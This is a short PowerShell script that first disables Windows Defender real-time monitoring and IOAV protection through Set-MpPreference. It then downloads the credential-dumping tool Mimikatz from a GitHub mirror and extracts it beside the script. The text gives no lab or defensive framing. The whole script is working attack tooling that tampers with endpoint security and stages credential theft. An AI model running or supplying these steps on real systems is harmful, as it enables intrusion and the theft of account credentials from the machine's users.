#Turning off AV
Write-Host "Turning off AV"
try{
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableIOAVProtection $true
}
catch{
        Write-Host "Error turning off AV make sure you are admin $_" 
}
#Install Mimikatz
try{
Invoke-WebRequest "https://github.com/ParrotSec/mimikatz/archive/refs/heads/master.zip" -OutFile "katz.zip"
$zipPath = Join-Path $PSScriptRoot "katz.zip"
$destPath = Join-Path $PSScriptRoot "katz"
Expand-Archive $zipPath -DestinationPath $destPath
Remove-Item $zipPath
}
catch {
        Write-Host "Error Downloading mimikatz $_" -ForegroundColor Red
        }
